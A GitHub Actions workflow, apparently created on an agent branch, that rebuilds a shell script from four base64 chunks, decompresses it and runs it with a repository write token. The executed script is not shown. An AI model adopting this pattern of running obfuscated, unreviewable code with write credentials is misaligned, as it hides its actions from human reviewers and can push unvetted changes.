name: PR31 OpenCode RLM differential publication v2

on:
  push:
    branches:
      - agent/pr31-opencode-rlm-verify-a6f1
    paths:
      - .github/workflows/pr31-opencode-rlm-differential-publish-v2.yml

permissions:
  contents: write
  pull-requests: read
  actions: read

concurrency:
  group: pr31-opencode-rlm-differential-publication-v2
  cancel-in-progress: false

jobs:
  verify-build-rust-publish:
    runs-on: ubuntu-22.04
    timeout-minutes: 150
    steps:
      - name: Checkout verification controls and payload
        uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - name: Set up Node 22
        uses: actions/setup-node@v5
        with:
          node-version: 22
          cache: npm
          cache-dependency-path: package-lock.json

      - name: Verify payload and run differential publication
        env:
          GH_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          set -euo pipefail
          payload_b64='${{ runner.temp }}/pr31_publish_v3.sh.gz.b64'
          payload_gz='${{ runner.temp }}/pr31_publish_v3.sh.gz'
          script='${{ runner.temp }}/pr31_publish_v3.sh'
          cat .github/pr31-opencode-rlm/payload.v3.00 \
              .github/pr31-opencode-rlm/payload.v3.01 \
              .github/pr31-opencode-rlm/payload.v3.02 \
              .github/pr31-opencode-rlm/payload.v3.03 > "$payload_b64"
          echo 'd0a95d77a7f750405d12925cfaadc387445c410a15d201f62b6f0edfc75e09b9  '"$payload_b64" | sha256sum -c -
          base64 --decode "$payload_b64" > "$payload_gz"
          gzip --decompress --stdout "$payload_gz" > "$script"
          echo 'c22aab390c06e0b53086db71ad680f5c8eaa08dd166258e3c0d8bfc2d607c158  '"$script" | sha256sum -c -
          chmod +x "$script"
          bash "$script"

      - name: Upload final differential and publication evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: pr31-opencode-rlm-differential-publication-v3
          path: ${{ runner.temp }}/pr31-final-evidence
          if-no-files-found: warn
          retention-days: 14
